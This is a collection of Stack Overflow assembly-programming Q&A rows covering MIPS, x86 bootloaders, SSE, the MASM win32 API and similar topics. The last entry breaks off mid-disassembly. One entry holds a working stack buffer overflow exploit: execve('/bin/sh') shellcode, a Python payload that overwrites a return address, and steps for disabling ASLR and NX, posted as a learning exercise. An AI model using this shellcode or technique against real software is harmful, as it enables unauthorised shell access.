<p>But you check for a condition, i. e. equality of $s0 and one of $tn, and on equality you jump to the routine that suits the case. Very well, but the routine is immediately following the <code>BEQ</code> instruction, so the branch is absolutely superfluous here. And further, if the condition is <em>not</em> met, the program continues with the code directly following the <code>BEQ</code> instruction.</p>

<p>The result is that the routines (add least ADDTN) are unconditionally executed. As said, I do not know what the syscalls do, but if addition works, I guess they are kinda jumps or so.</p>

<p>Anyway, you must rearrange your code so that depending on the state of the tested condition another branch of your code is executed. This is a generic ""template"":</p>

<pre><code>        beq $s0, $t0, equal
        # this code is executed if $s0 and $t0 differ
         .
         .
        jmp notequal        # avoid also executing the code for equal
equal:
        # code for the case $s0 and $t0 hold the same value
         .
         .
notequal:
        # all that follows executes with no regard of the checked condition
</code></pre>

<p>There are other techniques for branching several cases like yours (you seem to have to check four operations, I guess), but you should start understanding the basics first.</p>

<p>[update: Well, actually it's not that different, just that the code blocks are spread wider... /update]</p>

<p>Have fun...</p>
","12439897"
"Program Counter?","8244","","<p>If I understand this correctly, the program counter points to the address of the instruction to be executed and in most cases you add four to the program counter to advance to the next instruction address. But say you have a program counter that's pointing to a word (e.g word 15) in memory and you want to advance to the next instruction, are you suppose to add 4 directly to 15 in order to get the next instruction?? Any explanation would be appreciated</p>
","<p>That thing is called instruction pointer. Once the processor decodes the current instruction it finds how many bytes it occupies and knows how much to add to the current instruction pointer value to advance to the next instruction so that when the current instruction gets executed the processor knows what to do next.</p>

<p>So for example the processor starts with the instruction pointer storing value 15 as in your example - it looks what happens to be at that address, there happens to be an instruction occupying 5 bytes, no problem - it adds 5 to the current value and this yields 20 and so the instruction pointer now stores value 20 and the processor then executes the current instruction.</p>
","10105572"
"bootloader - switching processor to protected mode","8241","","<p>I'm having difficulties understanding how a simple boot loader works. The boot loader I'm talking about is the one from MITs course ""Operating Systems Engineering"". </p>

<p>First, let me show you a piece of assembly code the BIOS executes:</p>

<pre><code>[f000:fec3]    0xffec3: lidtw  %cs:0x7908
[f000:fec9]    0xffec9: lgdtw  %cs:0x7948
[f000:fecf]    0xffecf: mov    %cr0,%eax
[f000:fed2]    0xffed2: or     $0x1,%eax
[f000:fed6]    0xffed6: mov    %eax,%cr0
[f000:fed9]    0xffed9: ljmpl  $0x8,$0xffee1
</code></pre>

<p>From the looks of it, This code sets up the interrupt table and the descriptor table and then turns on the protected mode.  </p>

<ol>
<li>Why do we go into protected mode
in the BIOS? Shouldn't the
bootloader run in real mode (btw -
why does it need to run in real
mode?)</li>
<li>I searched but didn't find anywhere
exactly how the ljmpl instruction
works, and is the difference between
it and ljmp and regular jmp - I
would appreciate if someone would
point in the right direction.</li>
<li>Why do we perform the jump? What is
the purpose of this instruction? </li>
</ol>

<p>Moving on to the boot loader code - </p>

<pre><code># Switch from real to protected mode, using a bootstrap GDT
# and segment translation that makes virtual addresses
# identical to their physical addresses, so that the
# effective memory map does not change during the switch.
lgdt    gdtdesc
movl    %cr0, %eax
orl     $CR0_PE_ON, %eax
movl    %eax, %cr0

# Jump to next instruction, but in 32-bit code segment.
# Switches processor into 32-bit mode.
ljmp    $PROT_MODE_CSEG, $protcseg
</code></pre>

<ol>
<li>It says that the processor is in
real mode - but we just saw that the
BIOS switches to protected mode...
I'm confused - how can this be
possible?</li>
<li>How do we switch to 32bit mode? What
causes the processor to magically go
into 32bit mode due to the ljmp
instruction?</li>
</ol>

<p>And another thing that I don't understand - when I track the execution of the bootloader with gdb I see the following instruction being executed (that's the ljmp instruction from the bootloader code):</p>

<pre><code>ljmp   $0x8,$0x7c32
</code></pre>

<p>But when I looked in the .asm file I saw the following:</p>

<pre><code>ljmp   $0xb866,$0x87c32
</code></pre>

<p>Totally lost here - How come the instruction written in the .asm file and the instruction executed are different? I have a hunch this has to do with the protected mode and how it translates the addresses but I don't really get it.</p>

<p>I would appreciate any help!</p>
","<ol>
<li><p>Some BIOS implementations go into protected mode before entering the bootloader. Most don't. It is possible that BIOS switches to protected mode for a short period and switches back before going to the bootloader, which would allow it to use some of the benefits of protected mode (such as 32 bit being the default address size). The reason that the bootloader should be in real mode is that most BIOS functions only work in real mode, so you need to be in real mode to use them.</p></li>
<li><p>ljmp specifies a code segment to switch to in addition to the address to jump to. They are so similar that (at least in GAS) the assembler will switch a jmp with 2 operands to a ljmp for you.</p></li>
<li><p>ljmp is one of the only ways to change the cs register. This needs to be done to activate protected mode, as the cs register needs to contain the selector for a code segment in the GDT. (In case you want to know, the other ways to change cs are far call, far return, and interrupt return)</p></li>
<li><p>See item 1. Either BIOS switched back to real mode, or this bootloader will not work with this BIOS.</p></li>
<li><p>See item 3. It changes cs to specify a 32 bit code segment, so the processor goes into 32 bit mode.</p></li>
<li><p>When you looked at the .asm file, the instruction was interpretted as if the address size was 32 bits, but GDB interpretted it as if the address size was 16 bits. The data at the address of the instruction would be 0xEA 32 7C 08 00 66 B8. EA is the long jump opcode. In a 32 bit address space, the address would be specified using the next four bytes, for an address of 0x87C32, but in a 16 bit address space, only 2 bytes are used, for an address of 0x7C32. The 2 bytes after the address specify the requested code segment, which would be 0xB866 in 32 bit mode and 0x0008 in 16 bit mode. The 0x66 B8 is the start of the next instruction, which is moving a 16 bit immediate value into the ax register, probably to set up the data segments for protected mode.</p></li>
</ol>
","5213923"
"C Programming: difference between ++i and i=i+1 from an assembler point of view?","8235","","<p>This was an interview question. I said they were the same, but this was adjudged an incorrect response. From the assembler point of view, is there any imaginable difference? I have compiled two short C programs using default gcc optimization and -S to see the assembler output, and they are the same.</p>
","<p>The interviewer may have wanted an answer something like this:</p>

<blockquote>
  <p><code>i=i+1</code> will have to load the value of <code>i</code>, add one to it, and then store the result back to <code>i</code>.  In contrast, <code>++i</code> may simply increment the value using a single assembly instruction, so in theory it could be more efficient.  However, most compilers will optimize away the difference, and the generated code will be exactly the same.</p>
</blockquote>

<p>FWIW, the fact that you know how to look at assembly makes you a better programmer than 90% of the people I've had to interview over the years.  Take solace in the fact that you won't have to work with the clueless loser who interviewed you.</p>
","867705"
"How to print fibonacci series in assembly?","8235","","<p>I have tried to get the fibonnacci series up to a given number. But won't print correctly.
Here is my code. num is the given number.</p>

<pre><code>proc getFibo
        mov al,num

        mov cl,0
        mov bl,1

        mov dl,cl
        add dl,48
        mov ah,02h
        int 21h


        getNext:
            mov dl,bl
            add dl,48
            mov ah,02h
            int 21h

            add cl,bl

            mov dl,cl
            add dl,48
            mov ah,02h
            int 21h

            add bl,cl

            mov cl,bl
            add bl,1
            cmp bl,num
            jl getNext


        ret
    endp
</code></pre>

<p>Someone help me please.Thanks in advance..!</p>
","<pre><code>proc getFibo
        mov al,f1
        mov bl,f2

    ;mov cl,count
    ;cmp cl,num
    ;je exitFibo

    mov dl,al
    add dl,48
    mov ah,02h
    int 21h

    mov cl,count
    add cl,1
    mov count,cl

    mov dl,bl
    add dl,48
    mov ah,02h
    int 21h

    mov cl,count
    add cl,1
    mov count,cl

    calcFibo:
        mov al,f1
        add al,f2
        mov f1,al

        mov dl,f1
        add dl,48
        mov ah,02h
        int 21h

        mov cl,count
        add cl,1
        mov count,cl

        mov cl,count
        cmp cl,num
        je exitFibo

        mov bl,f2
        add bl,f1
        mov f2,bl

        mov dl,f2
        add dl,48
        mov ah,02h
        int 21h

        mov cl,count
        add cl,1
        mov count,cl

        mov cl,count
        cmp cl,num
        je exitFibo

        jmp calcFibo

    exitFibo:
    ret
endp
</code></pre>

<p>I have found the answer. Thank u all.</p>
","17035182"
"Why are complicated memcpy/memset superior?","8229","","<p>When debugging, I frequently stepped into the handwritten assembly implementation of memcpy and memset. These are usually implemented using streaming instructions if available, loop unrolled, alignment optimized, etc... I also recently encountered this <a href=""https://bugzilla.redhat.com/show_bug.cgi?id=638477#c99"">'bug' due to memcpy optimization in glibc</a>.</p>

<p>The question is: why can't the hardware manufacturers (Intel, AMD) optimize the specific case of</p>

<pre><code>rep stos
</code></pre>

<p>and</p>

<pre><code>rep movs
</code></pre>

<p>to be recognized as such, and do the <em>fastest</em> fill and copy as possible on <em>their own</em> architecture?</p>
","<p>Cost.</p>

<p>The cost of optimizing <code>memcpy</code> in your C library is fairly minimal, maybe a few weeks of developer time here and there.  You'll have to make a new version every several years or so when processor features change enough to warrant a rewrite.  For example, GNU's <code>glibc</code> and Apple's <code>libSystem</code> both have a <code>memcpy</code> which is specifically optimized for SSE3.</p>

<p>The cost of optimizing in hardware is much higher.  Not only is it more expensive in terms of developer costs (designing a CPU is vastly more difficult than writing user-space assembly code), but it would increase the transistor count of the processor.  That could have a number of negative effects:</p>

<ul>
<li>Increased power consumption</li>
<li>Increased unit cost</li>
<li>Increased latency for certain CPU subsystems</li>
<li>Lower maximum clock speed</li>
</ul>

<p>In theory, it could have an overall negative impact on both performance and unit cost.</p>

<p><strong>Maxim:</strong> Don't do it in hardware if the software solution is good enough.</p>

<p><strong>Note:</strong> The bug you've cited is not really a bug in <code>glibc</code> w.r.t. the C specification.  It's more complicated.  Basically, the glibc folks say that <code>memcpy</code> behaves exactly as advertised in the standard, and some other folks are complaining that <code>memcpy</code> should be aliased to <code>memmove</code>.</p>

<p><strong>Time for a story:</strong> It reminds me of a complaint that a Mac game developer had when he ran his game on a 603 processor instead of a 601 (this is from the 1990s).  The 601 had hardware support for unaligned loads and stores with minimal performance penalty.  The 603 simply generated an exception; by offloading to the kernel I imagine the load/store unit could be made much simpler, possibly making the processor faster and cheaper in the process.  The Mac OS nanokernel handled the exception by performing the required load/store operation and returning control to the process.</p>

<p>But this developer had a custom blitting routine to write pixels to the screen which did unaligned loads and stores.  Game performance was fine on the 601 but abominable on the 603.  Most other developers didn't notice if they used Apple's blitting function, since Apple could just reimplement it for newer processors.</p>

<p>The moral of the story is that better performance comes both from software and hardware improvements.</p>

<p><strong>In general,</strong> the trend seems to be in the opposite direction from the kind of hardware optimizations mentioned.  While in x86 it's easy to write <code>memcpy</code> in assembly, some newer architectures offload even more work to software.  Of particular note are the VLIW architectures: Intel IA64 (Itanium), the TI TMS320C64x DSPs, and the Transmeta Efficeon are examples.  With VLIW, assembly programming gets much more complicated: you have to explicitly select which execution units get which commands and which commands can be done at the same time, something that a modern x86 will do for you (unless it's an Atom).  So writing <code>memcpy</code> suddenly gets much, much harder.</p>

<p>These architectural tricks allow you to cut a huge chunk of hardware out of your microprocessors while retaining the performance benefits of a superscalar design.  Imagine having a chip with a footprint closer to an Atom but performance closer to a Xeon.  I suspect the difficulty of programming these devices are is the major factor impeding wider adoption.</p>
","8859053"
"How to write assembly language hello world program for 64 bit Mac OS X using printf?","8224","","<p>I am trying to learn writing assembly language for 64 bit Mac OS. I have no problem with 32 bit Mac OS and both 32 bit and 64 bit Linux.</p>

<p>However, Mac OS 64 bit is different and I couldn't figure out. Therefore I am here to ask for help.</p>

<p>I have not problem using system call to print. However, I would like to learn how to call C functions using 64 bit assembly language of Mac OS. </p>

<p>Please look at the following code</p>

<pre><code>.data
_hello:
    .asciz ""Hello, world\n""


.text
.globl _main
_main:
    movq $0, %rax
    movq _hello(%rip), %rdi
    call _printf
</code></pre>

<p>I use 
$ gcc -arch x86_64 hello.s</p>

<p>to assemble and link.</p>

<p>It generates binary code. However, I got a segmentation fault when running it.</p>

<p>I tried adding ""subq $8, %rsp"" before calling _printf, still the same result as before.</p>

<p>What did I do wrong?</p>

<p>By the way, is that any way to debug this code on Mac? I tried adding -ggdb or -gstab or -gDWARF, and 
$gdb ./a.out, and can't see the code and set break points.</p>
","<p>You didn't say exactly what the problem you're seeing is, but I'm guessing that you're crashing at the point of the call to <code>printf</code>.  This is because OS X (both 32- and 64-bit) requires that the stack pointer have 16-byte alignment at the point of any external function call.</p>

<p>The stack pointer was 16-byte aligned when <code>_main</code> was called; that call pushed an eight-byte return address onto the stack, so the stack is not 16-byte aligned at the point of the call to <code>_printf</code>.  Subtract eight from <code>%rsp</code> before making the call in order to properly align it.</p>

<hr>

<p>So I went ahead and debugged this for you (no magic involved, just use gdb, <code>break main</code>, <code>display/5i $pc</code>, <code>stepi</code>, etc).  The other problem you're having is here:</p>

<pre><code>movq _hello(%rip), %rdi
</code></pre>

<p>This loads the first eight bytes of your string into <code>%rdi</code>, which isn't what you want at all (in particular, the first eight bytes of your string are exceedingly unlikely to constitute a valid pointer to a format string, which results in a crash in <code>printf</code>).  Instead, you want to load the <em>address</em> of the string.  A debugged version of your program is:</p>

<pre><code>.cstring
_hello: .asciz ""Hello, world\n""

.text
.globl _main
_main:
    sub  $8, %rsp           // align rsp to 16B boundary
    mov  $0, %rax
    lea  _hello(%rip), %rdi // load address of format string
    call _printf            // call printf
    add  $8, %rsp           // restore rsp
    ret
</code></pre>
","8691824"
"Getting max value in a __m128i vector with SSE?","8218","","<p>I have just started using SSE and I am confused how to get the maximum integer value (<code>max</code>) of a <code>__m128i</code>.  For instance:</p>

<pre><code>__m128i t = _mm_setr_ps(0,1,2,3);
// max(t) = 3;
</code></pre>

<p>Searching around led me to <code>MAXPS</code> instruction but I can't seem to find how to use that with <code>""xmmintrin.h""</code>.  </p>

<p>Also, is there any documentation for <code>""xmmintrin.h""</code> that you would recommend, rather than looking into the header file itself?</p>
","<p>If you find yourself needing to do horizontal operations on vectors, especially if it's inside an inner loop, then it's <em>usually</em> a sign that you are approaching your SIMD implementation in the wrong way. SIMD likes to operate element-wise on vectors - ""vertically"" if you like, not horizontally.</p>

<p>As for documentation, there is a <a href=""https://software.intel.com/sites/landingpage/IntrinsicsGuide/"" rel=""nofollow"">very useful reference on intel.com</a> which contains all the opcodes and intrinsics for everything from MMX through the various flavours of SSE all the way up to AVX and AVX-512.</p>
","9878321"
"How to exit a loop in assembly","8217","","<p>I have a loop with a couple of conditions, which means that when the loop is finished, it will proceed to go through the remaining loop segment. How can I force the program to skip past the remaining loop segment even if ecx is already at 0?</p>
","<p>Loops and conditions are created with LABELS, COMPARISONS and JUMPS:</p>

<pre><code>xor ecx,ecx                ;ECX = 0
mov eax,8                  ;EAX = 8
mov ebx,4                  ;EBX = 4

START_LOOP:

sub eax,ebx                ;EAX = EAX - EBX
cmp eax,ecx                ;compare EAX and ECX
jne START_LOOP             ;if EAX != ECX, jump back and loop
                           ;When EAX = ECX, execution continues pas the jump
</code></pre>

<hr>

<p>You can loop a number of times using a loop index that we usually put in ECX:</p>

<pre><code>xor ecx,ecx                ;ECX = 0
mov eax,2                  ;EAX = 2
mov ebx,2                  ;EBX = 2

START_LOOP:

add eax,ebx                ;EAX = EAX + EBX
inc ecx                    ;ECX = ECX + 1
cmp ecx,5                  ;compare ECX and 5
jne START_LOOP             ;if ECX != 5 jump back and loop
                           ;When ECX == 5, execution continues pas the jump
</code></pre>

<hr>

<p>Last, you can use conditions inside a loop using different labels:</p>

<pre><code>xor ecx,ecx                ;ECX = 0
mov eax,2                  ;EAX = 2
xor ebx,ebx                ;EBX = 0

START_LOOP:

cmp eax,ebx               ;compare EAX and EBX
jle CONTINUE              ;if EAX &lt;= EBX jump to the CONTINUE label
inc ebx                   ;else EBX = EBX + 1
jmp START_LOOP            ;JUMP back to the start (until EBX&gt;=EAX)
                          ;You'll never get past this jump until the condition in reached

CONTINUE:
add eax,ebx                ;EAX = EAX + EBX
inc ecx                    ;ECX = ECX + 1
cmp ecx,5                  ;compare ECX and 5
jne START_LOOP             ;if ECX != 5 jump back and loop
                           ;When ECX == 5, execution continues pas the jump
</code></pre>
","7782421"
"How does sscanf work? (in assembly)","8208","","<p>I'm in the process of trying to decode some assembly code generated from a binary.  There's a call to the <code>sscanf</code> function in the code:</p>

<pre><code> 400f08:       e8 13 fc ff ff          callq  400b20 &lt;sscanf@plt&gt;
 400f0d:       89 45 fc                mov    %eax,-0x4(%rbp)
</code></pre>

<p>Can you tell me how <code>sscanf</code> works in assembly?  I'm pretty sure the number of arguments is stored in <code>%eax</code>....does it push the input into the stack in reverse order?  So say my input is <code>0 1</code>, after running sscanf, <code>%eax</code>=2 and the stack looks like:</p>

<pre><code>1
0  &lt;----%rsp (top of the stack)
</code></pre>

<p>Is this correct?
Thanks!</p>
","<p>Follow the calling convention of the platform, as normal. 32-bit Linux uses cdecl by default, which has you push all the arguments onto the stack in reverse order. 64-bit Linux uses the System V AMD64 ABI convention, which uses <code>RDI</code>, <code>RSI</code>, <code>RDX</code>, <code>RCX</code>, <code>R8</code>, and <code>R9</code> for integers and address and the XMM registers for floating point arguments (with surplus arguments going on the stack).</p>

<p>The number of arguments isn't pushed anywhere; AFAIK <code>sscanf</code> determines this from the format string (though I'm happy to be corrected). The System V AMD64 ABI (64-bit) does specify that <code>AL</code> is used to store the number of XMM registers used (from 0 to 8), but that applies to floating-point arguments only (which should never be arguments to <code>sscanf</code>).</p>
","13097677"
"error a2070 invalid instruction operands","8202","","<p>I'm newbie in Win32 Assembly:</p>

<p>I learn code this program, it's Window simple. But I get the error:</p>

<blockquote>
  <p>error a2070 invalid instruction operands (MASM)</p>
</blockquote>

<p>I have searched on google about this error, but I still don't understand.</p>

<pre><code>.386
.model flat, stdcall
option casemap:none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib

WinMain PROTO :HINSTANCE, :HINSTANCE, :LPSTR, :DWORD

.data
    AppName     db ""First Windows"", 0
    ClassName   db ""Window Class"", 0

.data?
    hInstance   dd ?
    CommandLine dd ?

.code
start:
    invoke  GetModuleHandle, NULL
    MOV     hInstance, EAX
    invoke  GetCommandLine
    MOV     CommandLine, EAX
    invoke  WinMain, hInstance, NULL, CommandLine, SW_SHOWDEFAULT
    invoke  ExitProcess, EAX

    WinMain PROC ahInstance:HINSTANCE, \
            ahPrevInstance:HINSTANCE, \
            aCommandLine:LPSTR, \
            aCommandShow:DWORD
        LOCAL   wc:WNDCLASSEX
        LOCAL   hwnd:HANDLE
        LOCAL   msg:MSG

        MOV     wc.cbSize, SIZEOF WNDCLASSEX
        MOV     wc.style, CS_HREDRAW or CS_VREDRAW
        MOV     wc.lpfnWndProc, offset WndProc
        MOV     wc.cbClsExtra, NULL
        MOV     wc.cbWndExtra, NULL
        MOV     wc.hInstance, hInstance ;;;;;;;;;;;;;;;; Error here

        invoke  LoadIcon, NULL, IDI_APPLICATION
        MOV     wc.hIcon, EAX
        MOV     wc.hIconSm, EAX
        invoke  LoadCursor, NULL, IDC_ARROW
        MOV     wc.hCursor, EAX
        MOV     wc.hbrBackground, COLOR_WINDOW+1
        MOV     wc.lpszMenuName, NULL
        MOV     wc.lpszClassName, offset ClassName

        invoke  RegisterClassEx, addr wc

        invoke  CreateWindowEx, NULL, addr ClassName, addr AppName, \
                WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, \
                CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, ahInstance, NULL
        MOV     hwnd, EAX

        invoke  ShowWindow, hwnd, SW_SHOWNORMAL
        invoke  UpdateWindow, hwnd

        .WHILE TRUE
            invoke  GetMessage, addr msg, NULL, 0, 0
            .BREAK .IF (!EAX)
            invoke  TranslateMessage, addr msg
            invoke  DispatchMessage, addr msg
        .ENDW

        MOV EAX, msg.wParam
        RET
    WinMain endp

    WndProc PROC ahWnd:HWND, aMsg:DWORD, awParam:WPARAM, alParam:LPARAM
        .IF aMsg == WM_DESTROY
            invoke  PostQuitMessage, NULL
        .ELSE
            invoke  DefWindowProc, ahWnd, aMsg, awParam, alParam
            ret
        .ENDIF
        XOR EAX, EAX
        ret
    WndProc endp
end start
</code></pre>

<p>That line:</p>

<pre><code>MOV     wc.hInstance, hInstance
</code></pre>

<p>gets an error, I replace by:</p>

<pre><code>PUSH hInstance
POP  wc.hInstance
</code></pre>

<p>--> this is OK.</p>

<p>But I  don't understand WHY ???</p>

<p>Anyone can help me.</p>
","<p><code>wc.hInstance</code> refers to a part of <code>wc</code>, which is on the stack, and is thus in memory. <code>hInstance</code> is also on the stack, and is thus in memory. If you try any memory-to-memory move, you'll notice that it doesn't work:</p>

<pre><code>mov [esp], [ebp]
error: invalid operand.
</code></pre>

<p>That's just a limitation of the x86 instruction set; the x86 instruction set <em>has no</em> memory-to-memory move. You'll have to make it into two instructions like you did with <code>push</code> and <code>pop</code>.</p>
","19238776"
"Not sure why we add the registers %rdx and %rax when the assembly code has been using %eax and %edx","8200","","<p>Hello I need some help understanding what is going on in this assembly code:</p>

<pre><code>        .file   ""mystery.c""

        .text

        .globl mystery

              .type mystery, @function

 mystery:
   pushq    %rbp
    movq    %rsp, %rbp

   movl %edi, -20(%rbp)
   movl $1, -16(%rbp)
   movl $0, -12(%rbp)
   movl $0, -8(%rbp)
   cmpl $2, -20(%rbp)
   jg   .L2
   movl $1, %eax
   jmp  .L3

  .L2:
movl    $2, -4(%rbp)
jmp .L4

  .L5:
movl    -12(%rbp), %eax
movl    -16(%rbp), %edx
leal    (%rdx,%rax), %eax
movl    %eax, -8(%rbp)
movl    -16(%rbp), %eax
movl    %eax, -12(%rbp)
movl    -8(%rbp), %eax
movl    %eax, -16(%rbp)
addl    $1, -4(%rbp)

.L4:
movl    -4(%rbp), %eax
cmpl    -20(%rbp), %eax
jle .L5
movl    -8(%rbp), %eax

.L3:
leave
ret
</code></pre>

<p>I understand exactly what is going on UNTIL I get to .L5, Here the command <code>leal(%rdx, %rax)</code>, eax is what is confusing me.  Up until now ive been moving values to eax and edx and now im adding the values in rdx and rax.  Where is rdx and rax coming from and what values are they holding?  Are they just another way of writing eax and edx?  Thanks for any help.</p>
","<p>See <a href=""https://stackoverflow.com/a/228231/1167234"">this</a> related answer. It explains the different registers and their evolution. In this case, the <code>%rax</code> register is a 64 bit register. <code>%eax</code> is the 32 bit one, and <code>%ax</code> would be 16 bits. <code>%ah</code> refers to the high 8 bits of the 16 bits in the register, and <code>%al</code> refers to the lower end.</p>

<p>This little diagram was taken from another answer to the same question, but it shows it well...</p>

<pre><code>|63..32|31..16|15-8|7-0|
               |AH.|AL.|
               |AX.....|
       |EAX............|
|RAX...................|
</code></pre>
","13127669"
"Shellcode for a simple stack overflow: Exploited program with shell terminates directly after execve(""/bin/sh"")","8178","","<p>I played around with buffer overflows on Linux (amd64) and tried exploiting a simple program, but it failed. I disabled the security features (address space layout randomization with sysctl -w kernel.randomize_va_space=0 and nx bit in the bios). It jumps to the stack and executes the shellcode, but it doesn't start a shell. The execve syscall succeeds but afterwards it just terminates. Any idea what's wrong? Running the shellcode standalone works just fine.</p>

<p>Bonus question: Why do I need to set rax to zero before calling printf? (See comment in the code)</p>

<p>Vulnerable file <strong>buffer.s</strong>:</p>

<pre><code>.data
.fmtsp:
.string ""Stackpointer %p\n""
.fmtjump:
.string ""Jump to %p\n""
.text
.global main
main:
    push %rbp
    mov %rsp, %rbp

    sub $120,  %rsp

    # calling printf without setting rax
    # to zero results in a segfault. why?
    xor %rax, %rax 
    mov %rsp, %rsi
    mov $.fmtsp, %rdi
    call printf

    mov %rsp, %rdi
    call gets

    xor %rax, %rax
    mov $.fmtjump, %rdi
    mov 8(%rbp), %rsi
    call printf

    xor %rax, %rax
    leave
    ret
</code></pre>

<p><strong>shellcode.s</strong></p>

<pre><code>.text
.global main
main:
    mov $0x68732f6e69622fff, %rbx
    shr $0x8, %rbx
    push %rbx
    mov %rsp, %rdi
    xor %rsi, %rsi
    xor %rdx, %rdx
    xor %rax, %rax
    add $0x3b, %rax
    syscall
</code></pre>

<p><strong>exploit.py</strong></p>

<pre><code>shellcode = ""\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x48\x83\xc0\x3b\x0f\x05""
stackpointer = ""\x7f\xff\xff\xff\xe3\x28""
output = shellcode
output += 'a' * (120 - len(shellcode)) # fill buffer
output += 'b' * 8 # override stored base pointer
output += ''.join(reversed(stackpointer))
print output
</code></pre>

<p>Compiled with:</p>

<pre><code>$ gcc -o buffer buffer.s
$ gcc -o shellcode shellcode.s
</code></pre>

<p>Started with:</p>

<pre><code>$ python exploit.py | ./buffer
Stackpointer 0x7fffffffe328
Jump to 0x7fffffffe328
</code></pre>

<p>Debugging with gdb:</p>

<pre><code>$ python exploit.py &gt; exploit.txt (Note: corrected stackpointer address in exploit.py for gdb)
$ gdb buffer
(gdb) run &lt; exploit.txt
Starting program: /home/henning/bo/buffer &lt; exploit.txt
Stackpointer 0x7fffffffe308
Jump to 0x7fffffffe308
process 4185 is executing new program: /bin/dash

Program exited normally.
</code></pre>
","<p>I'm having pretty much the same problem right now with Ubuntu 9.10 in a VM.
Disabled all the security measurements of the OS, and simple exploits like ""exit the program and set exit-code to 42"" do work, but when trying to open a shell, the program just terminates.
Output of gdb is identical:</p>

<pre>(gdb) run &lt; exploit.0xbffff3b8 
Starting program: /home/seminar/ubung/target/client &lt; exploit.0xbffff3b8

Enter password: Sorry. Wrong password.
Executing new program: /bin/bash

Program exited normally.
(gdb)</pre>

<p>Thing is, I need it working in approx. 16 hours for a presentation :-D</p>

<hr>

<p>Update:
I found this neat study: www.shell-storm.org/papers/files/539.pdf</p>

<p>On page 16 it says:
""If we try to execute a shell, it terminates immediately in this configuration""</p>

<p>In other examples that don't use gets(), they do very well spawn a shell. Unfortunately, they don't give a hint on WHY it doesn't work that way. :(</p>

<hr>

<p>Next Update:
It seems it has to do with stdin. The shell cannot properly use the one it gets from the original process. I tried using a minimal shell I found the sourcecode for (evilsh). It crashed at the point where it tried to read input. My guess is, that bash/dash checks for this and just silently exits when something is wrong with stdin.</p>

<hr>

<p>Ok please don't kill me for having this conversation with myself here, but...</p>

<p>I found a solution!</p>

<p>For some reason it is necessary to reopen the inputs. I found a working shellcode here:</p>

<p><a href=""http://www.milw0rm.com/shellcode/2040"" rel=""noreferrer"">http://www.milw0rm.com/shellcode/2040</a></p>

<p>I don't see a prompt tough, but I can run programs etc. using the shell that opens.</p>
","2869460"
"Load 32-bit constant to register in MIPS","8162","","<p>I was confused about this part while I study MIPS.</p>

<p>The textbook written by Professor <a href=""http://en.wikipedia.org/wiki/John_L._Hennessy"" rel=""nofollow"">John L. Hennessy</a> say if we get some <em>big</em> constant to load, we should</p>

<pre><code>lui $s0, upper(big)
ori $s0, $s0, lower(big)
</code></pre>

<p>But why don't we just do</p>

<pre><code>addi $s0, $zero, big
</code></pre>

<p>Since the registers are 32-bit, this is more strightforward, isn't it?</p>
","<p>The immediate argument passed to <code>addi</code> is only 16 bits. To load a 32 bit immediate value that is outside the range of a 16 bit value you need to do it in two goes, as in the example from your text book.</p>

<p>(Anticipating a further question, the reason there is no load immediate or add immediate instruction which take  a 32 bit immediate value is because the MIPS ISA uses fixed size 32 bit instructions, so there are always &lt; 32 bits available for any instruction arguments - this is very common in RISC architectures.)</p>
","13160980"
"Trouble reversing a string in assembly","8156","","<p>I am trying to reverse a string in assembly.
However my code does not seem to work correctly.
I added a newline string for better readability.</p>

<p>I am using linux and nasm as compiler.</p>

<p>I thought that if I took the values of the adresspointers and switched them at the correct place, the string would eventually be reversed and then get back to normal.</p>

<p>This is my code:</p>

<pre><code>section .data
    hello     db 'Hello world!'
    helloLen  equ $-hello
    derp db '=========',10
    derplen equ $-derp

section .text
    global main

main:
    mov eax,0
    mov ecx,helloLen

    reverse:
        ;move pointer
        mov ebx,hello
        add ebx,eax
        push eax

        ;move pointer
        mov eax,hello
        add eax,ecx
        push ecx

        ;switch bytes
        push ebx
        mov ebx,[ebx]
        mov [eax],ebx
        pop ebx
        mov eax,[eax]
        mov [ebx],eax

        ;print text
        mov eax,4
        mov ebx,1
        mov ecx,hello
        mov edx,helloLen
        int 80h

        ;Print newline
        mov eax,4
        mov ebx,1
        mov ecx,derp
        mov edx,derplen
        int 80h

        ;increment and decrement
        pop ecx
        dec ecx
        pop eax
        inc eax

        cmp eax,helloLen
    jne reverse

    end:
        mov eax,1
        mov ebx,0
        int 80h
</code></pre>

<p>This is the output I get:</p>

<pre><code>Hello world!Hell=====
Hello worldellol=====
Hello worlllo ol=====
Hello worlo w ol=====
Hello woo wow ol=====
Hello wooooow ol=====
Hello wooooow ol=====
Helloooooooow ol=====
Helloooooooow ol=====
Helooowooooow ol=====
Heoow wooooow ol=====
How o wooooow ol=====
</code></pre>
","<p>The way to reverse a string by swapping characters is to swap the first and last, then the second and next to last, etc. In C, you would write:</p>

<pre><code>for (i = 0; i &lt; len/2; ++i)
{
    c = s[i];
    s[i] = s[len-i-1];
    s[len-i-1] = c;
}
</code></pre>

<p>In assembly language, the easiest way is to set up the ESI and EDI registers to point to the start and end of the string, then loop. At each iteration, you increment ESI and decrement EDI. The result looks something like this:</p>

<pre><code>mov ecx, helloLen
mov eax, hello
mov esi, eax  ; esi points to start of string
add eax, ecx
mov edi, eax
dec edi       ; edi points to end of string
shr ecx, 1    ; ecx is count (length/2)
jz done       ; if string is 0 or 1 characters long, done
reverseLoop:
mov al, [esi] ; load characters
mov bl, [edi]
mov [esi], bl ; and swap
mov [edi], al
inc esi       ; adjust pointers
dec edi
dec ecx       ; and loop
jnz reverseLoop
</code></pre>
","13587751"
"Jumping to the next ""instruction"" using gdb","8119","","<p>I am attempting to figure the canary value setting and checking mechanism.</p>

<pre>
#include 
int main(void)
{
        return printf(""Hi!\n"");
}
</pre>

<p>When disassemble the main, I get</p>

<pre>
(gdb) disas main
0x080483f4 :    lea    0x4(%esp),%ecx
0x080483f8 :    and    $0xfffffff0,%esp
0x080483fb :    pushl  -0x4(%ecx)
0x080483fe :   push   %ebp
0x080483ff :   mov    %esp,%ebp
0x08048401 :   push   %ecx
0x08048402 :   sub    $0x14,%esp
0x08048405 :   mov    %gs:0x14,%eax
0x0804840b :   mov    %eax,-0x8(%ebp)
0x0804840e :   xor    %eax,%eax
0x08048410 :   movl   $0x8048500,(%esp)
0x08048417 :   call   0x8048320 
